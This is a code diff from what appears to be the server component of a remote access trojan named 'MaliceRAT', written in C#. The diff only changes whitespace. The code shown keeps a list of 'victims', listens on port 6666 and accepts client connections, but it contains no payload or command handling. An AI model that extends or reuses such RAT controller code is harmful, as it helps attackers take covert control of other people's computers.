@@ -21,11 +21,10 @@ namespace MaliceRAT.RatServer
         private const int Port = 6666;
         private List<Victim> victims = new List<Victim>();
         private Dictionary<int, Task> clientTasks = new Dictionary<int, Task>();
-
+        
         public Server()
         {
         }
-
         public void StartServer()
         {
             IPAddress ipAddress = IPAddress.Parse("127.0.0.1");
@@ -34,7 +33,6 @@ namespace MaliceRAT.RatServer
             Console.WriteLine("Server started at " + server.LocalEndpoint);
             Task.Run(async () => await AcceptClients());
         }
-
         private async Task AcceptClients()
         {
             while (true)
